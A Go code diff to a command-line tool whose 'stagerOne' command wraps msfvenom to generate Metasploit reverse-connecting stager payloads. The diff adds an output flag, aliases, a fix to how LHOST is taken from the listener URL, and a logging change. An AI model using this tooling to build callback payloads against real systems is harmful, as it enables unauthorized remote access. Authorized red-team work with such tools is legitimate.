@@ -16,6 +16,7 @@ var Opt = struct {
 	Format     string
 	Advanced   string
 	ListenURL  string
+	Output     string
 }{}
 
 func init() {
@@ -23,15 +24,17 @@ func init() {
 	StagerOneCmd.Flags().StringVarP(&Opt.Format, "format", "f", "raw", "output format")
 	StagerOneCmd.Flags().StringVarP(&Opt.Advanced, "advanced", "a", "", "advanced options")
 	StagerOneCmd.Flags().StringVarP(&Opt.ListenURL, "listenUrl", "l", "tcp://127.0.0.1:4444", "listener URL")
+	StagerOneCmd.Flags().StringVarP(&Opt.Output, "output", "o", "/dev/stdout", "output file")
 	c.RootCmd.AddCommand(StagerOneCmd)
 }
 
 var log = logrus.WithField("cmd", "stagerOne")
 
 var StagerOneCmd = &cobra.Command{
-	Use:   "stagerOne",
-	Short: "stagerOne Generates a common stager",
-	Long:  "stagerOne",
+	Use:     "stagerOne",
+	Aliases: []string{"st", "stager1", "stage1", "s1"},
+	Short:   "stagerOne Generates a common stager",
+	Long:    "stagerOne",
 	Run: func(cmd *cobra.Command, args []string) {
 		args, err := ArgCreate(Opt.StagerType, Opt.ListenURL, Opt.Format)
 		if err != nil {
@@ -91,7 +94,8 @@ func ArgCreate(stagerType, listenerURL, format string) ([]string, error) {
 		"--arch", arch,
 		"--format", format,
 		"--payload", payloadName,
-		fmt.Sprintf("LHOST=%s", u.Host),
+		"-o", Opt.Output,
+		fmt.Sprintf("LHOST=%s", u.Hostname()),
 		fmt.Sprintf("LPORT=%s", port),
 		"EXITFUNC=thread",
 	}
@@ -112,7 +116,7 @@ func msfvenom(args []string) ([]byte, error) {
 	cmd.Stdout = stdout
 	cmd.Stderr = stderr
 	err := cmd.Run()
-	log.Println(cmd.String())
+	log.Info(cmd.String())
 	if err != nil {
 		log.Debugf("--- stdout ---\n%s\n", stdout.String())
 		log.Debugf("--- stderr ---\n%s\n", stderr.String())
